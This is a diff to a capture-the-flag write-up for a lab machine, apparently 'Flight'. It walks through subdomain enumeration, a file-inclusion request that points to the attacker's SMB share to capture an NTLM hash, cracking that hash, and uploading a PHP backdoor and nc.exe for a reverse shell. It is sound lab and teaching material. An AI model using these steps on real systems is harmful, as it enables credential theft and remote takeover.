@@ -65,6 +65,7 @@ ffuf -v -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -
 ```
 
 It looks like there's a subdomain called `school.flight.htb`. We'll add it to our `/etc/hosts` file. 
+
 ![Adding school.flight.htb to hosts](Images/school_hosts.png)
 
 When we browse `school.flight.htb`, we'll see that it's using `index.php?view=` to grab other files. This is a very old method to use and a very bad practice for security since it's prone to **file inclusion** attacks. First, we will try requesting our own **HTTP** server with a `phpinfo()` script but it looks like the code is only being read and not executed.
@@ -92,6 +93,7 @@ curl -i -k -s http://school.flight.htb/index.php?view=//10.10.16.16/dir/file
 Just like we thought, we captured a NTLM hash on our `responder` -
 
 ![Captured hash of svc_apache](Images/apache_hash.png)
+
 which can be cracked using tools like `john` or `hashcat`. 
 ```john
 john --wordlist=/usr/share/wordlists/rockyou.txt hash
@@ -177,6 +179,7 @@ cp /usr/share/webshells/php/simple-backdoor.php ./rev.php
 ```
 
 And then, we'll upload it to `flight.htb` to see if we can get a code execution -
+
 ![Code Execution with PHP](Images/code_execution_php.png)
 
 As we can see, our PHP backdoor is working perfectly. So, we'll upload `nc.exe` for a reverse shell. It is in the `/usr/share/windows-resources/binaries`. We'll also copy it to current directory - 
